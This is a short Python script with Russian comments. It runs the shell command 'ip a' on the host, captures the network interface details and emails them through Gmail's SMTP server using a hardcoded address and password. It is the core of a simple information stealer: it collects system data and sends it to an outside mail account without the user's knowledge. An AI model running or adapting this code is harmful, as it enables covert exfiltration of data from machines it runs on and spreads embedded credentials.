#!/usr/bin/env python
import subprocess, smtplib

def send_mail(email, password, message):
    # создаем экземпляр smtp сервера, сервер гугла
    server = smtplib.SMTP('smtp.gmail.com', 587)
    # отправляем письмо, устанавливаем TLS-соединение
    server.starttls()
    # авторизируемся
    server.login(email, password)
    # отправляем письмо, откуда, куда, содержимое письма
    server.sendmail(email, email, message)
    # выходим с сервера
    server.quit()
# команда для запуска программы
commmand = "ip a"
# Захватываем результат в переменную
result = subprocess.check_output(commmand, shell=True)
send_mail("bf232@gmail.com", "p23232", result)
